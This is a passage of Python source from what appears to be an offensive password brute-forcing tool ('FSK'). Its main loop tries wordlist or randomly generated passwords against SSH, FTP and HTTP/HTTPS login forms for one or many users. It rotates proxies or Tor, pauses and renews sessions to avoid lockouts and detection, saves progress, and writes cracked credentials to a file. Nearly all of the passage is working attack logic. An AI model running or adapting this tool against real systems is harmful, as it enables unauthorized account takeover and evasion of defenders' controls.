        start_time = time.time()
        attempt_count = 0
        args = parse_arguments()

        if args.prefix:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Prefix module loaded", level=2)
        
        if args.suffix:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Suffix module loaded", level=2)
        
        if args.pause:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Pause module loaded", level=2)
        
        if args.sessions:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Session module loaded.", level=2)
        iterations = args.iterations
        time.sleep(0.5)

        service = args.service[0]
        port = get_port(args)
        pause_after_minutes = None
        pause_duration_minutes = None
        csrf_token = None
        cookie_value = None

        if args.csrf:
            csrf_token = args.csrf # Get the CSRF token passed through the argument
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} CSRF token module loaded", level=2)

  

        if args.pause:
            
            pause_after_minutes = args.pause[0]
            pause_duration_minutes = args.pause[1]
            next_pause_time = time.time() + pause_after_minutes * 60  # Calculate when to trigger the pause

        
        if args.rand:
            
            min_len = args.rand[0]
            max_len = args.rand[1]
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Random passwords with min: {min_len} and max: {max_len}", level=2)
            args.wordlist = generate_random_password_list(min_length=min_len, max_length=max_len)
       
        if args.tor and args.proxies:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} You cannot use both Tor and a proxy file at the same time!")
            exit(1)

        if args.tor:
            handle_timeout(set_up_tor)
        if isinstance(port, int):
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
            if not is_service_running(args.ip, port, service):
                print(f"{Fore.RED}ERROR: No service running on the specified port.")
                exit(1)


        else:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")

            if not is_service_running(args.ip, port, service):
                print(
                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} ERROR: No service running on the specified port.")
                exit(1)

        proxies = []
        if args.proxies:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Loading proxies from file ....")
            proxies = load_proxies_from_file(args.proxies)

        passwords = [line.strip() for line in open(args.wordlist, 'r', encoding='latin-1').readlines()]
        
        if args.suffix:
            passwords = [f"{password}{random.choice(common_suffixes)}" for password in passwords]
        if args.prefix:
            passwords = [f"{random.choice(common_prefixes)}{password}" for password in passwords]
        if args.user:
            users = [args.user]  # Single user case
        else:
            users = args.users  # File-based users case
        if args.resume:
            saved_state = load_progress()
            if saved_state:
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.YELLOW} Resuming from the last saved state...{Fore.RESET}")
                attempt_count = saved_state['attempt_count']
                passwords = saved_state['remaining_passwords']
                users = saved_state['remaining_users']
            else:
                print(f"{Fore.RED} No saved state found, starting from the beginning.{Fore.RESET}")
        
        password_chunk_size = 3
        first_iteration = True

        proxy_gen = None
        if proxies:
            proxy_gen = cycle_through_proxies(proxies)
        ssh_auth_type_checked = False
        for i in range(0, len(passwords), password_chunk_size):
            for idx, user in enumerate(users):
                if pause_after_minutes and time.time() >= next_pause_time:
                    pause_attack(pause_after_minutes, pause_duration_minutes)
                    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Pausing every {pause_after_minutes} for {pause_duration_minutes}", level=2)
                    next_pause_time = time.time() + pause_after_minutes * 60  # 
                if args.sessions:
                    
                    if len(users) > 1:  # First user in list case
                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Creating a new session..")
                        session = create_new_session()  # Your session creation logic here
                    elif len(users) == 1 and i % 12 == 0:  # Single user case
                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Creating a new session..")
                        session = create_new_session()  # Your session creation logic here
                proxy_ip, proxy_port = next(proxy_gen) if proxy_gen else (None, None)

                if proxy_ip:
                    print(
                        f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")

                if idx == 0:
                    if not first_iteration:
                        print(f"\n{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...\n")
                else:
                    print(f"\n{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....\n")

                if 'ssh' in service and not ssh_auth_type_checked:
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Checking SSH authentication type.")
                    time.sleep(0.6)
                    auth_type = test_ssh_auth_type(args.ip)
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Detected {auth_type}.")
                    if auth_type == "RSA key authentication":
                        print(
                            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} RSA Key authentication, Bruteforce will not work. Exiting.")
                        exit(0)
                    else:
                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Continuing..")
                    ssh_auth_type_checked = True

                for j in range(min(iterations, len(passwords) - i)):
                    if i + j >= len(passwords):
                        break
                    password = passwords[i + j]
                    print(current_timestamp(),
                          f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
                    attempt_count += 1
                    time_elapsed = time.time() - start_time
                    if 'ssh' in service:
                        if not ssh_auth_type_checked:
                            auth_type = test_ssh_auth_type(args.ip)
                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Detected {auth_type}.")
                            if auth_type == "RSA key authentication":
                                print(current_timestamp(),
                                      f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} RSA Key authentication, Bruteforce will not work. Exiting")
                                exit(0)
                            ssh_auth_type_checked = True
                        if port is not None:
                            port = int(port)
                        else:
                            port = 22

                        if handle_timeout(ssh_attack, args.ip, port, user, password, proxy_ip, proxy_port):
                            print(
                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
                            save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
                            users.remove(user)

                            break
                    if 'ftp' in service:
                        if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
                            print(
                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
                            save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
                            users.remove(user)
                            break
                    if 'http' in service:
                        if not args.http_post:
                            raise ValueError(
                                f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTP POST parameters must be specified for HTTP attack.")
                        if not (
                                args.failure_content_length or args.success_content_length or args.success_pattern or args.failure_pattern):
                            raise ValueError(
                                f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} At least one response parameter must be specified for HTTP service.")

                        result = http_attack(args.ip, user, password, http_post_params=args.http_post,
                                             success_pattern=args.success_pattern,
                                             failure_pattern=args.failure_pattern,
                                             csrf_token=csrf_token, 
                                           
                                             success_content_length=args.success_content_length,
                                             failure_content_length=args.failure_content_length,
                                             proxy_ip=None, proxy_port=None)

                        if result is True:
                            save_to_file(args.ip, args.service, user, password, attempt_count)
                            users.remove(user)
                            print(current_timestamp(),
                                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
                            break
                        else:
                            verbose_print(
                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed attempt for user {Fore.YELLOW}{user}{Fore.RESET} with pass: {Fore.YELLOW}{password}", level=1)
                            
                      
                    if 'https' in service:
                        if not args.http_post:
                            raise ValueError(
                                f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTPS POST parameters must be specified for HTTPS attack.")
                        if not (
                                args.failure_content_length or args.success_content_length or args.success_pattern or args.failure_pattern):
                            raise ValueError(
                                f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} At least one response parameter must be specified for HTTPS service.")

                        result = https_attack(args.ip, user, password, https_post_params=args.http_post,
                                              success_pattern=args.success_pattern,
                                              failure_pattern=args.failure_pattern,
                                              success_content_length=args.success_content_length,
                                              csrf_token=csrf_token, 
                                          
                                              failure_content_length=args.failure_content_length,
                                              proxy_ip=None, proxy_port=None)

                        if result is True:
                            save_to_file(args.ip, args.service, user, password, attempt_count)
                            print(current_timestamp(),
                                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password}")
                            break  # Go to the next user
                        else:
                            verbose_print(
                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed attempt for user {Fore.YELLOW}{user}{Fore.RESET} with pass: {Fore.YELLOW}{password}", level=1)
                            
                save_progress(attempt_count, user, password, users[idx:], passwords[i + j + 1:])
            first_iteration = False

        print(current_timestamp(),
              f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.BLUE} Attack complete. FSK - Written by: Derek Johnston")
        print(current_timestamp(),
              f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.BLUE} Support HFSK. BTC: bc1qu9h3l4dgzrgpy0e26n98ytjzpxxeqw57vaprvq")

        if args.rand:
            os.remove(args.wordlist)

    except KeyboardInterrupt:
        print("\n", current_timestamp(),
              f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED. FSK - Written by: Derek Johnston")
        save_progress(attempt_count, user, password, users[idx:], passwords[i + j + 1:])
        exit(0)
    except EOFError:
        print("\n", current_timestamp(),
              f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unexpected End of File (EOF) encountered. Exiting.")
        exit(1)
